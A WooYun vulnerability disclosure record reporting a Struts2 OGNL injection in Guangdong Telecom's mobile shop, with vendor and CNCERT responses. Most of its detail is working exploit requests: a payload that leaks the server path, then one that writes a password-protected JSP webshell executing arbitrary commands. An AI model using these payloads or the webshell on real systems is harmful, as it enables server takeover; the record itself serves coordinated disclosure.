{"id": 77680, "wybug_id": "wooyun-2015-0161987", "wybug_title": "广东电信手机商城远程命令执行(绕waf来getshell)", "wybug_corp": "广东电信", "wybug_author": "落", "wybug_date": "2015-12-17 10:42", "wybug_open_date": "2016-02-01 10:51", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-01：\t细节向公众公开  简要描述： 继上次广东电信政企客户系统可命令执行并getshell未被审核通过之后，发现手机商城也存在命令执行的问题，搞不好还有其他系统受害..... 详细说明：  访问广东电信官网：http://**.**.**.**/， 点击“天翼商城订单”，如图：\n\n抓包，并修改为POST提交（获取服务器部署地址）：\nPOST /telOrder/searchOrderFirst.action?ssid=gdsb-syleft-wdxx-wddd-ddcx HTTP/1.1Host: m.**.**.**.**Proxy-Connection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36Referer: http://**.**.**.**/Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: citrix_ns_id=ZjOcbelh7QKTodZs5ZkWLJeSK40A000; **.**.**.**_%2F_wlf=aWRf?dixY9fgviG7lVnF8o1NjENW6bA0A&TlNDX3h1LTIyMi42OC4xODUuMjI5?NsNVGZ1ouCBNq/CMOEeCK+p6z4YA&; **.**.**.**_%2F_wat=SlNFU1NJT05JRF9f?YtTo0DgicCbpr01IGjV0BQD5kH8A&; i_vnum=5; i_sq=eship-gdt-prd-new%3D%2526pid%253D**.**.**.**%2526pidt%253D1%2526oid%253Dhttp%25253A%25252F%25252Fm.**.**.**.**%25252FtelOrder%25252FsearchOrderFirst.action%25253Fssid%25253Dgdsb-syleft-wdxx-wddd-ddcx%2526ot%253DA; EmallSessionId=A905C5ADD287242233A04617D1698148; looyu_id=991fe062f0225303b3aebd4ce82c94ba27_39415%3A1; Hm_lvt_e1acdde81d08199bf8f8b416afd00f2f=1450280455,1450281244; Hm_lpvt_e1acdde81d08199bf8f8b416afd00f2f=1450281244; LATN_CODE_COOKIE=020; svid=7746D5EDA455CD4E; i_sess=%20ssid%3Dgdsb-syleft-wdxx-wddd-ddcx%3B; ijg=1450281244082; ijg_s=More%20than%207%20days; i_invisit=1; i_PV=m.**.**.**.**%2FtelOrder%2FsearchOrderFirst.action; i_url=%5B%5BB%5D%5D; i_cc=true; TS2c9cf1=9fe84fa7fcf2dfab51d71750e2d02da02e9c3c8821d1799c5671891c; adslAccount=; i_ppv=63; ecss_identity=81578062288320528943; looyu_39415=v%3A279a44548f85c9900534d438b4f536266d%2Cref%3Ahttp%253A//**.**.**.**/%2Cr%3A%2Cmon%3Ahttp%3A//**.**.**.**/monitorContent-Type: multipart/form-data; boundary=------------------------5423a63046c50524a84963968721Content-Length: 258--------------------------5423a63046c50524a84963968721Content-Disposition: form-data; name=\"redirect:/${#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletRequest\").getRealPath(\"/\")}\"-1--------------------------5423a63046c50524a84963968721\n执行效果：\n\n接下来写入小的webshell（excuteMingl.jsp）:\nPOST /telOrder/searchOrderFirst.action?ssid=gdsb-syleft-wdxx-wddd-ddcx HTTP/1.1Host: m.**.**.**.**Proxy-Connection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36Referer: http://**.**.**.**/Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: citrix_ns_id=ZjOcbelh7QKTodZs5ZkWLJeSK40A000; **.**.**.**_%2F_wlf=aWRf?dixY9fgviG7lVnF8o1NjENW6bA0A&TlNDX3h1LTIyMi42OC4xODUuMjI5?NsNVGZ1ouCBNq/CMOEeCK+p6z4YA&; **.**.**.**_%2F_wat=SlNFU1NJT05JRF9f?YtTo0DgicCbpr01IGjV0BQD5kH8A&; i_vnum=5; i_sq=eship-gdt-prd-new%3D%2526pid%253D**.**.**.**%2526pidt%253D1%2526oid%253Dhttp%25253A%25252F%25252Fm.**.**.**.**%25252FtelOrder%25252FsearchOrderFirst.action%25253Fssid%25253Dgdsb-syleft-wdxx-wddd-ddcx%2526ot%253DA; EmallSessionId=A905C5ADD287242233A04617D1698148; looyu_id=991fe062f0225303b3aebd4ce82c94ba27_39415%3A1; Hm_lvt_e1acdde81d08199bf8f8b416afd00f2f=1450280455,1450281244; Hm_lpvt_e1acdde81d08199bf8f8b416afd00f2f=1450281244; LATN_CODE_COOKIE=020; svid=7746D5EDA455CD4E; i_sess=%20ssid%3Dgdsb-syleft-wdxx-wddd-ddcx%3B; ijg=1450281244082; ijg_s=More%20than%207%20days; i_invisit=1; i_PV=m.**.**.**.**%2FtelOrder%2FsearchOrderFirst.action; i_url=%5B%5BB%5D%5D; i_cc=true; TS2c9cf1=9fe84fa7fcf2dfab51d71750e2d02da02e9c3c8821d1799c5671891c; adslAccount=; i_ppv=63; ecss_identity=81578062288320528943; looyu_39415=v%3A279a44548f85c9900534d438b4f536266d%2Cref%3Ahttp%253A//**.**.**.**/%2Cr%3A%2Cmon%3Ahttp%3A//**.**.**.**/monitorContent-Type: multipart/form-data; boundary=------------------------5423a63046c50524a84963968721Content-Length: 604--------------------------5423a63046c50524a84963968721Content-Disposition: form-data; name=\"redirect:/${\"x\"+(new **.**.**.**.PrintWriter(\"/home/ecss/emallTelWeb8082/webapps/emallTelWeb/excuteMingl.jsp\")).append(\"<%if(\\\"023\\\".equals(request.getParameter(\\\"pwd\\\"))){**.**.**.**.InputStream in = Runtime.getRuntime().exec(request.getParameter(\\\"i\\\")).getInputStream()\\u003bint a = -1\\u003bbyte[] b = new byte[2048]\\u003bout.print(\\\"<pre>\\\")\\u003bwhile((a=in.read(b))!=-1){out.println(new String(b))\\u003b}out.print(\\\"</pre>\\\")\\u003b}%>\").close()}\"-1--------------------------5423a63046c50524a84963968721\n发现执行成功：\n\n   漏洞证明：  访问刚刚写入的webshell：\nhttp://**.**.**.**/emallTelWeb/excuteMingl.jsp\n\n\n\n\n\n\n   修复方案：  struts2赶紧升级最新版本吧   版权声明：转载请注明来源 落@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-12-21 18:28 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国电信集团公司通报,由其后续协调网站管理部门处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}